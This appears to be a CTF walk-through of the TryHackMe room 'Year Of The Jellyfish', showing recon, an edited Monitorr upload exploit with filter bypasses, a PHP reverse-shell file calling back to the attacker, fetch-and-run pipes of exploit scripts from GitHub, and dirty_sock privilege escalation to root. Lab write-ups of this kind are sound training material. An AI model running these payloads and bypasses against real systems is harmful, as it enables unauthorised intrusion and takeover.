---
title: "Walk-through of Year Of The Jellyfish from TryHackMe"
header:
  teaser: /assets/images/2021-04-27-21-20-46.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Linux
  - Monitorr
  - snapd
---

## Machine Information

![jellyfish](/assets/images/2021-04-27-21-20-46.png)

Year Of The Jellyfish is a hard difficulty room on TryHackMe. An initial scan finds a number of open ports as well as several subdomains. Enumeration of the accessible web sites reveals a vulnerable version of Monitorr. A publicly available exploit needs a number of alterations to work, but eventually we gain a reverse shell. From there we use an out of date version of snapd to side load a new user, then escalate to root.

<!--more-->

Skills required are basic enumeration and file manipulation. Skills learned are analysing defences and manipulating exploits to avoid them.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Hard - Year Of The Jellyfish](https://tryhackme.com/room/yearofthejellyfish) |
| Machine Release Date | 12th April 2021 |
| Date I Completed It | 27th April 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# ports=$(nmap -p- --min-rate=1000 -T1 54.155.36.125 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/thm/jellyfish]
└─# nmap -p$ports -sC -sV -oA jellyfish 54.155.36.125
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 22:48 BST
Nmap scan report for robyns-petshop.thm (54.155.36.125)
Host is up (0.032s latency).

PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)
80/tcp    open  http     Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to https://robyns-petshop.thm/
443/tcp   open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Robyn&#039;s Pet Shop
| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
| Not valid before: 2021-04-25T21:29:59
|_Not valid after:  2022-04-25T21:29:59
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
8000/tcp  open  http-alt
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 15
|_    Request
|_http-title: Under Development!
8096/tcp  open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Date: Sun, 25 Apr 2021 21:48:45 GMT
|     Server: Kestrel
|     Content-Length: 0
|     X-Response-Time-ms: 569
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Date: Sun, 25 Apr 2021 21:48:19 GMT
|     Server: Kestrel
|     Content-Length: 0
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 Found
|     Connection: close
|     Date: Sun, 25 Apr 2021 21:48:19 GMT
|     Server: Kestrel
|     Content-Length: 0
|     Location: /web/index.html
|   Help, Kerberos, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Date: Sun, 25 Apr 2021 21:48:34 GMT
|     Server: Kestrel
|     Content-Length: 0
|   LPDString: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Date: Sun, 25 Apr 2021 21:48:45 GMT
|     Server: Kestrel
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Connection: close
|     Date: Sun, 25 Apr 2021 21:48:19 GMT
|     Server: Kestrel
|_    Content-Length: 0
22222/tcp open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:99:92:52:8e:73:ed:91:01:d3:a7:a0:87:37:f0:4f (RSA)
|   256 5a:c0:cc:a1:a8:79:eb:fd:6f:cf:f8:78:0d:2f:5d:db (ECDSA)
|_  256 0a:ca:b8:39:4e:ca:e3:cf:86:5c:88:b9:2e:25:7a:1b (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.37 seconds
```

There's a fair few ports open, first let's add the IP to our hosts file:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# echo 54.155.36.125 robyns-petshop.thm >> /etc/hosts
```

## Robyns Petshop

Looking through the list I see a few interesting things. Let's start with what looks to be a website on port 443. Note port 80 has a redirect to 443 so we can ignore that:

![jellyfish-port80](/assets/images/2021-04-25-22-38-53.png)

Going to the website we're first presented with a warning. We can see there is a self signed certificate in use for this site. Click View Certificate to have a look:

![jellyfish-certificate](/assets/images/2021-04-25-22-39-40.png)

This reveals the certificate has three additional Subject Alternate Names:

```text
monitorr.robyns-petshop.thm
beta.robyns-petshop.thm
dev.robyns-petshop.thm
```

We also saw these on the nmap scan. Let's add them to our hosts file:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# sed -i '/54.155.36.125 robyns-petshop.thm/ s/$/ monitorr.robyns-petshop.thm beta.robyns-petshop.thm dev.robyns-petshop.thm/' /etc/hosts
```

Continuing on to the site we see a single static page:

![jellyfish-website](/assets/images/2021-04-25-22-49-10.png)

Nothing noteworthy in the source code, an assets folder contains the pictures used on the site:

![jellyfish-source](/assets/images/2021-04-25-22-51-01.png)

Looking at dev.robyns-petshop.thm it appears to be identical to the normal site. Let's move on to the beta site which looks more interesting, as it mentions putting a specific ID at the end of the URL:

![jellyfish-beta](/assets/images/2021-04-25-22-53-29.png)

The http-title also reveals that is the site being hosted on port 8000, as we see the same title from the nmap scan earlier on that port. I make a note of that, as I might have to come back to it later.

## Monitorr

Now let's look at the last of the subdomains:

![jellyfish-monitorr](/assets/images/2021-04-25-23-08-25.png)

This last site appears to be an application that is keeping an eye on the other sites. I've not heard of monitorr before so I follow the GitHub link [here](https://github.com/monitorr/Monitorr) and have a look:

```text
"Monitorr” is a self-hosted PHP web app that monitors the status of local and remote network services, websites, and applications.
```

Sounds interesting. Looking back at the version we have running I notice a version number at the bottom of the page:

![jellyfish-monitorr-version](/assets/images/2021-04-25-23-12-49.png)

Let's check searchsploit:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# searchsploit monitorr 1.7.6
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
Monitorr 1.7.6m - Authorization Bypass                    | php/webapps/48981.py
Monitorr 1.7.6m - Remote Code Execution (Unauthenticated) | php/webapps/48980.py
---------------------------------------------------------- ---------------------------------
```

Looks like we've found the intended way in. [This](https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/) article explains how the two exploits work.

Let's have a look at the first one:

```text
import requests
import os
import sys

if len (sys.argv) != 5:
        print ("specify params in format: python " + sys.argv[0] + " target_url user_login user_email user_password")
else:
    url = sys.argv[1] + "/assets/config/_installation/_register.php?action=register"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", >
    data = {"user_name": sys.argv[2], "user_email": sys.argv[3], "user_password_new": sys.argv[4], "user_password_repeat": sys.argv[4], "register": "Register"}
    requests.post(url, headers=headers, data=data)
    print ("Done.")
```

It's a short script, the key part is this bit where we are accessing a post installation file to register a new account:

```text
url = sys.argv[1] + "/assets/config/_installation/_register.php?action=register"
```

Unfortunately, if we browse to that we see is isn't accessible:

![jellyfish-monitorr-bypass](/assets/images/2021-04-26-16-45-39.png)

Let's have a look at the other exploit:

```text
import requests
import os
import sys

if len (sys.argv) != 4:
        print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-Wi>

    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.php\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'b>

    requests.post(url, headers=headers, data=data)

    print ("A shell script should be uploaded. Now we try to execute it")
    url = sys.argv[1] + "/assets/data/usrimg/she_ll.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", >
    requests.get(url, headers=headers)
```

Again another fairly short script, this one takes advantage of poor checking of user input, allowing us to upload a php shell that looks like an image. This is the important URL:

```text
url = sys.argv[1] + "/assets/php/upload.php"
```

Browsing to this path looks better:

![jellyfish-monitorr-rce](/assets/images/2021-04-26-16-49-49.png)

Let's try the exploit:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# python 48980.py https://monitorr.robyns-petshop.thm/ 10.8.165.116 443
Traceback (most recent call last):
  File "48980.py", line 24, in <module>
    requests.post(url, headers=headers, data=data)
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/api.py", line 119, in post
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/api.py", line 61, in request
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/sessions.py", line 530, in request
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/sessions.py", line 643, in send
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/adapters.py", line 514, in send
requests.exceptions.SSLError: HTTPSConnectionPool(host='monitorr.robyns-petshop.thm', port=443): Max retries exceeded with url: //assets/php/upload.php (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
```

First problem is this python script doesn't handle SSL connections. We can change it so there is no verification of the certificate. Add this line underneath the imports:

```text
import requests
import os
import sys

requests.packages.urllib3.disable_warnings()
```

Now change the post and get requests so they have verify=False in them:

```text
<SNIP>
    requests.post(url, headers=headers, data=data, verify=False)
<SNIP>
    requests.get(url, headers=headers, verify=False)
<SNIP>
```

Try it again:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# python 4898xx.py https://monitorr.robyns-petshop.thm/ 10.8.165.116 443
A shell script should be uploaded. Now we try to execute it
```

It says it worked, but my waiting netcat listener didn't catch anything. If I look in the folder where the file should have been uploaded I can see it didn't work:

![jellyfish-usrimg](/assets/images/2021-04-26-22-04-19.png)

Before leaving the browser I check for cookies, press Shift+F9 to bring up the Storage Inspector. I see there is a cookie called isHuman: "1" which must be blocking our exploit:

![jellyfish-cookie](/assets/images/2021-04-26-17-19-57.png)

## Debugging Exploit

Time to do a little investigating using Curl to see what protections are in place. First we can try and upload a file using the same method in the exploit but direct from Curl:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# curl -k -F "fileToUpload=@./BlackUnicorn.png" https://monitorr.robyns-petshop.thm/assets/php/upload.php
<div id='uploadreturn'>You are an exploit.</div><div id='uploaderror'>ERROR: BlackUnicorn.png was not uploaded.</div></div>
```

Above -k tells Curl to ignore the certificate check. We can see my attempt to upload a picture failed. Let's try adding the cookie we found before:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# curl -k -F "fileToUpload=@./BlackUnicorn.png" https://monitorr.robyns-petshop.thm/assets/php/upload.php -H "Cookie: isHuman=1"
<div id='uploadreturn'>File BlackUnicorn.png is an image: <br><div id='uploadok'>File BlackUnicorn.png has been uploaded to: ../data/usrimg/blackunicorn.png</div></div>
```

That looks better. Now let's try a php file, like the exploit does:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# echo -e $'hello from pencer' > test.php

┌──(root💀kali)-[~/thm/jellyfish]
└─# curl -k -F "fileToUpload=@./test.php" https://monitorr.robyns-petshop.thm/assets/php/upload.php -H "Cookie: isHuman=1"
<div id='uploadreturn'><div id='uploaderror'>ERROR: test.php is not an image or exceeds the webserver’s upload size limit.</div><div id='uploaderror'>ERROR: test.php was not uploaded.</div></div>
```

So we can see there is a check to see if the uploaded file is an image, we can try a GIF89a [magic byte](https://www.netspi.com/blog/technical/web-application-penetration-testing/magic-bytes-identifying-common-file-formats-at-a-glance/?print=print) and double extension to get around this:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# echo -e $'\x47\x49\x46\x38\x39\x61\nhello from pencer' > test2.gif.php

┌──(root💀kali)-[~/thm/jellyfish]
└─# curl -k -F "fileToUpload=@./test2.gif.php" https://monitorr.robyns-petshop.thm/assets/php/upload.php -H "Cookie: isHuman=1"
<div id='uploadreturn'><div id='uploaderror'>ERROR: test2.gif.php is not an image or exceeds the webserver’s upload size limit.</div><div id='uploaderror'>ERROR: test2.gif.php was not uploaded.</div></div>
```

Still no good, let's see if the check is case sensitive:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# curl -k -F "fileToUpload=@./test2.gif.PHP" https://monitorr.robyns-petshop.thm/assets/php/upload.php -H "Cookie: isHuman=1"
<div id='uploadreturn'>File test2.gif.PHP is an image: <br><div id='uploadok'>File test2.gif.PHP has been uploaded to: ../data/usrimg/test2.gif.php</div></div>
```

That worked, so it was just looking for lower case php, not uppercase! Let's check we can see it:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# curl -k https://monitorr.robyns-petshop.thm/assets/data/usrimg/test2.gif.php
GIF89a
hello from pencer
```

One last check, can we upload some actual php code and execute it:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# echo -e $'\x47\x49\x46\x38\x39\x61\n<?php echo system("whoami");' > test3.gif.PHP

┌──(root💀kali)-[~/thm/jellyfish]
└─# curl -k -F "fileToUpload=@./test3.gif.PHP" https://monitorr.robyns-petshop.thm/assets/php/upload.php -H "Cookie: isHuman=1"
<div id='uploadreturn'>File test3.gif.PHP is an image: <br><div id='uploadok'>File test3.gif.PHP has been uploaded to: ../data/usrimg/test3.gif.php</div></div>

┌──(root💀kali)-[~/thm/jellyfish]
└─# curl -k https://monitorr.robyns-petshop.thm/assets/data/usrimg/test3.gif.php
GIF89a
www-data
www-data  
```

That worked. We've bypassed the protections and uploaded php code that we can execute remotely. We could just upload a shell using Curl, but let's go back to the exploit and get that working with what we've learnt:

```text
import requests
import os
import sys

requests.packages.urllib3.disable_warnings()

if len (sys.argv) != 4:
        print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-Wi>

    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"pencer_shell.png.PHP\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/>

    requests.post(url, headers=headers, data=data, verify=False, cookies={"isHuman": "1"})

    print ("A shell script should be uploaded. Now we try to execute it")
    url = sys.argv[1] + "/assets/data/usrimg/pencer_shell.png.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", >
    requests.get(url, headers=headers, verify=False, cookies={"isHuman": "1"})
```

Above you can see I've done the following:

```text
Suppressed the SSL warning by disabling it using a urllib3 setting.
Added verify=False to the post and get requests.
Changed the name of the exploit file being created to have a double extension with PHP in uppercase.
Changed the later call to the uploaded file to the same name, but with a lowercase php as it gets changed on upload.
```

## Gaining Access

I ran the exploit, but my netcat listener on port 4444 didn't catch anything. We know using curl we've been working on port 443, let's try that:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# python 48980.py https://monitorr.robyns-petshop.thm/ 10.8.165.116 443
A shell script should be uploaded. Now we try to execute it
```

Switching to my listener, and at last we have a shell connected:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# nc -nlvp 443
listening on [any] 443 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.22.95] 37004
bash: cannot set terminal process group (1091): Inappropriate ioctl for device
bash: no job control in this shell
www-data@petshop:/var/www/monitorr/assets/data/usrimg$
```

## Upgrade Shell

Let's upgrade to a better shell before we proceed, first check my local Kali terminal size:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# stty size
61 237
```

Now sort out my shell:

```text
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ ^Z
┌──(root💀kali)-[~/thm/diffctf]
└─# stty raw -echo; fg
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ stty rows 61 cols 237
```

First, who are we, what groups are we in, are there any other users:

```text
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@petshop:/var/www/monitorr/assets/data/usrimg$ ls -lsa /home
total 12
4 drwxr-xr-x  3 root  root  4096 Apr  9 23:46 .
4 drwxr-xr-x 23 root  root  4096 Apr  9 23:56 ..
4 drwxr-xr-x  6 robyn robyn 4096 Apr 16 19:31 robyn
```

## Flag 1

There's a user Robyn, but nothing in their home drive. Moving up folders from my starting point I find the first flag:

```text
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ cd ../../../..
www-data@petshop:/var/www$ ls -l
drwxr-xr-x 9 root     root     4096 Apr 11 17:00 dev
-r-------- 1 www-data www-data   38 Apr 11 23:11 flag1.txt
drwxr-xr-x 9 root     root     4096 Apr 11 14:38 html
drwxr-xr-x 4 www-data www-data 4096 Apr 11 14:24 monitorr

www-data@petshop:/var/www/monitorr/assets/data/usrimg$ cat /var/www/flag1.txt
cat /var/www/flag1.txt
THM{HIDDEN}
```

## Privilege Escalation

Now we need to find a way to escalate ourselves to root. [LinPEAS](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjX96HhoZ7wAhVPPOwKHXXlAK0QFjAAegQIBBAD&url=https%3A%2F%2Fgithub.com%2Fcarlospolop%2Fprivilege-escalation-awesome-scripts-suite%2Ftree%2Fmaster%2FlinPEAS&usg=AOvVaw309l-RiVX5qZhYA8KxOYqQ) didn't find anything interesting. So I tried the [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) which gave a number of options:

```text
www-data@petshop:/tmp$ wget -O - https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash

--2021-04-26 22:52:26--  https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 87559 (86K) [text/plain]
Saving to: 'STDOUT'
     0K .......... .......... .......... .......... .......... 58% 1.36M 0s
    50K .......... .......... .......... .....                100%  257K=0.2s
2021-04-26 22:52:26 (492 KB/s) - written to stdout [87559/87559]

Available information:
Kernel version: 4.15.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 18.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:
76 kernel space exploits
48 user space exploits

Possible Exploits:
[+] [CVE-2021-3156] sudo Baron Samedit
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell
   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2019-7304] dirty_sock
   Details: https://initblog.com/2019/dirty-sock/
   Exposure: less probable
   Tags: ubuntu=18.10,mint=19
   Download URL: https://github.com/initstring/dirty_sock/archive/master.zip
   Comments: Distros use own versioning scheme. Manual verification needed.

[+] [CVE-2019-18634] sudo pwfeedback
   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF
   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe
   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
```

## Dirty Sock

I worked through them in order, I had no luck with the first three. The fourth one called dirty_sock looked interesting, it exploits a vulnerability in snapd. There's two versions, the second one works on box by sideloading a new account. First check the version we have here:

```text
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ snap version
snap    2.32.5+18.04
snapd   2.32.5+18.04
series  16
ubuntu  18.04
kernel  4.15.0-140-generic
```

The website doesn't mention the version of snapd this works against, but checking serchsploit we see it looks possible:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# searchsploit snapd                                                                                                                     
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation    | linux/local/46361.py
snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation    | linux/local/46362.py
------------------------------------------------------------------- ---------------------------------
```

Let's try it by downloading and executing direct from GitHub:

```text
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ wget -O - https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py | python3
--2021-04-27 13:56:55--  https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8696 (8.5K) [text/plain]
Saving to: 'STDOUT'
- 100%[=====================================================================================>]   8.49K  --.-KB/s    in 0s      

2021-04-27 13:56:55 (54.4 MB/s) - written to stdout [8696/8696]
      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 2)
//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//

[+] Slipped dirty sock on random socket file: /tmp/ktmllpkbup;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...
```

Did it work?

```text
www-data@petshop:/var/www/monitorr/assets/data/usrimg# cat /etc/passwd | grep dirty
dirty_sock:x:1001:1001::/home/dirty_sock:/bin/bash
```

Account was created, let's try and switch user:

```text
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ su dirty_sock
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
dirty_sock@petshop:/var/www/monitorr/assets/data/usrimg$
```

What can we do?

```text
dirty_sock@petshop:/var/www/monitorr/assets/data/usrimg$ sudo -l
Matching Defaults entries for dirty_sock on petshop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

Runas and Command-specific defaults for dirty_sock:
    Defaults!/sbin/service jellyfin restart, /usr/sbin/service jellyfin restart !requiretty
    Defaults!/sbin/service jellyfin start, /usr/sbin/service jellyfin start !requiretty
    Defaults!/sbin/service jellyfin stop, /usr/sbin/service jellyfin stop !requiretty
    Defaults!/usr/bin/systemctl restart jellyfin, /bin/systemctl restart jellyfin !requiretty
    Defaults!/usr/bin/systemctl start jellyfin, /bin/systemctl start jellyfin !requiretty
    Defaults!/usr/bin/systemctl stop jellyfin, /bin/systemctl stop jellyfin !requiretty
    Defaults!/etc/init.d/jellyfin restart !requiretty
    Defaults!/etc/init.d/jellyfin start !requiretty
    Defaults!/etc/init.d/jellyfin stop !requiretty

User dirty_sock may run the following commands on petshop:
    (ALL : ALL) ALL
    (ALL : ALL) ALL
```

Everything! Awesome. Let's get to root just because we can:

```text
dirty_sock@petshop:/var/www/monitorr/assets/data/usrimg$ sudo su
[sudo] password for dirty_sock:

root@petshop:/var/www/monitorr/assets/data/usrimg# id
uid=0(root) gid=0(root) groups=0(root)
```

## Root Flag

All that's left now is to get the flag:

```text
root@petshop:/var/www/monitorr/assets/data/usrimg# ls -l /root
-r-------- 1 root root   38 Apr 11 23:12 root.txt
drwxr-xr-x 3 root root 4096 Apr 27 13:57 snap

root@petshop:/var/www/monitorr/assets/data/usrimg# cat /root/root.txt 
THM{HIDDEN}
```

We've completed the room, however there is another way we could have got our initial shell. Instead of using the exploit from the terminal, we can actually do it all from within the monitorr website. Let's have a look at that as we explore another method in Root+1

## Root+1

```text
**UPDATE - Note this unintended path has since been patched**
```

When we first visited the monitorr page, we saw this:

![jellyfish-monitorr+1](/assets/images/2021-04-27-21-50-08.png)

If we right click on the red and green image and view it we see a path to the assets folder:

![jellyfish-assets+1](/assets/images/2021-04-27-22-16-56.png)

If you enumerate around you'll find this installation folder for vendor:

![jellyfish-vendor+1](/assets/images/2021-04-27-21-52-38.png)

Being curious I clicked on the _install.php file:

![jellyfish-install+1](/assets/images/2021-04-27-22-07-54.png)

Not sure what users.db is but sounds good it's been created. Now if we click on the login.php file we see this:

![jellyfish-login+1](/assets/images/2021-04-27-22-15-05.png)

If you click the register new account link you end up here, where you can enter details to create an account:

![jellyfish-newuser+1](/assets/images/2021-04-27-21-48-37.png)

Clicking Register gets us this message:

![jellyfish-create-account+1](/assets/images/2021-04-27-21-52-08.png)

Suggests we are logged in to something. If we go back to the settings page of the main monitorr site we are now logged in:

![jellyfish-settings+1](/assets/images/2021-04-27-21-53-15.png)

Clicking on Services Configuration on the left gets us to the two that have already been configured:

![jellyfish-services+1](/assets/images/2021-04-27-21-53-36.png)

Now clicking on the Images button brings up a dialog where we can select our shell:

![jellyfish-shell+1](/assets/images/2021-04-27-21-56-26.png)

The same rules apply as before, so it has the magic byte to imitate a picture, and a double extension with PHP in upper case:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# cat shell.png.PHP                                                   
�PNG
▒
<?php echo system("bash -c 'bash -i >& /dev/tcp/10.8.165.116/443 0>&1'");
```

Selecting our file brings this dialog up that tells us where the file will be uploaded to:

![jellyfish-image+1](/assets/images/2021-04-27-21-56-44.png)

Clicking upload gives us this dialog which confirms it uploaded successfully:

![jellyfish-image-upload+1](/assets/images/2021-04-27-21-57-01.png)

Browsing to the folder we see the file is there:

![jellyfish-assets+1](/assets/images/2021-04-27-21-58-35.png)

Switching to a waiting netcat listener we have our initial shell connected:

```text
┌──(root💀kali)-[/home/kali]
└─# nc -nlvp 443   
listening on [any] 443 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.245.50] 50230
